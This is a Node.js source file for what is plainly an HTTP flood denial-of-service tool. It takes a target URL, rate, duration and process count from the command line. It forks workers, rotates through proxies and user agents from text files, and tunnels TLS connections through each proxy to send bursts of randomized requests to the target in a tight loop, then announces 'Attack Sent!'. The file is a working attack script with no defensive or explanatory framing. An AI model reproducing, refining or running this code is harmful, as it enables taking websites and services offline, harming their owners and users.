const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var theJar = request_2.jar();
const path = require("path");
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;

var VarsDefinetions = {
Objetive: process.argv[4],
MethodRequest: process.argv[2],
time: process.argv[5],
process_count: process.argv[3],
rate:process.argv[6]
}

try {

    var colors = require('colors');

} catch (err) {

    console.log('');
    execSync('npm install colors');
    console.log('');
    process.exit();
}

var fileName = __filename;
var file = path.basename(fileName);

try {

    var proxies = fs.readFileSync('proxy.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
	var UAs = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');

} catch (err) {

    if (err.code !== 'ENOENT') throw err;
    console.log('The ua.txt and proxy.txt');
    process.exit();
}

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}
function RandomString(length) {
  var result           = '';
  var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for ( var i = 0; i < length; i++ ) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
var parsed = url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);
let browser_saves = '';


const cluster = require('cluster');
const numCPUs = VarsDefinetions.process_count;

if (cluster.isPrimary) {

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`procces ${worker.process.pid} end`);
  });
} else {

function BuildRequest() {
let path = parsed.path;
if (path.indexOf("[rand]") !== -1){
	path = path.replace(/\[rand\]/g,RandomString(getRandomNumberBetween(5,16)));
}

var raw_socket = `${VarsDefinetions.MethodRequest} `+
path+
' HTTP/1.3\r\nHost: '+parsed.host+'\r\nReferer: '+
VarsDefinetions.Objetive+'\r\nOrigin: '+
VarsDefinetions.Objetive+
'\r\nAccept: */*\r\nuser-agent: '+
 UAs[Math.floor(Math.random() * UAs.length)] +
 '\r\nUpgrade-Insecure-Requests: 1\r\n'+
 'Accept-Encoding: *\r\n'+
 'Accept-Language: en-US,en;q=0.9\r\n'+
 'Cache-Control: max-age=0\r\n'+
 'Connection: Keep-Alive\r\n\r\n'
return raw_socket;
}

setInterval(function() {

var aa = getRandomNumberBetween(100, proxies.length-400);

var proxy = proxies[Math.floor(Math.random() * aa)];
proxy = proxy.split(':');

const agent = new http.Agent({
keepAlive: true,
keepAliveMsecs: 50000,
maxSockets: Infinity,
});

var tlsSessionStore = {};

var req = http.request({
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
      headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'Keep-Alive',
    'Connection': 'Keep-Alive',
  },
    method: 'CONNECT',
    path: parsed.host+':443'
}, function(){ 
    req.setSocketKeepAlive(true);
 });

req.on('connect', function (res, socket, head) {
    tls.authorized = true;
    tls.sync = true;
    var TlsConnection = tls.connect({
        ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        secureProtocol: ['TLSv1_2_method','TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
        honorCipherOrder: true,
        requestCert: true,
        host: parsed.host,
        port: 443,
        secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,
        servername: parsed.host,
        secure: true,
        rejectUnauthorized: false,
        socket: socket
    }, function () {

for (let j = 0; j < VarsDefinetions.rate; j++) {

TlsConnection.setKeepAlive(true, 10000)
TlsConnection.setTimeout(10000);
var r = BuildRequest();
TlsConnection.write(r);

}
});

TlsConnection.on('disconnected', () => {
    TlsConnection.destroy();
});

TlsConnection.on('timeout' , () => {
    TlsConnection.destroy();
});

TlsConnection.on('error', (err) =>{
    TlsConnection.destroy();
});

TlsConnection.on('data', (chunk) => {
    setTimeout(function () { 
        TlsConnection.abort(); 
        return delete TlsConnection
    }, 10000); 
});

    TlsConnection.on('end', () => {
      TlsConnection.abort();
      TlsConnection.destroy();
    });

}).end()
}, 0);
}



setTimeout(() => {
  process.exit(1);
}, VarsDefinetions.time*1000)

console.log('Attack Sent! target - '+VarsDefinetions.Objetive+' time - '+VarsDefinetions.time);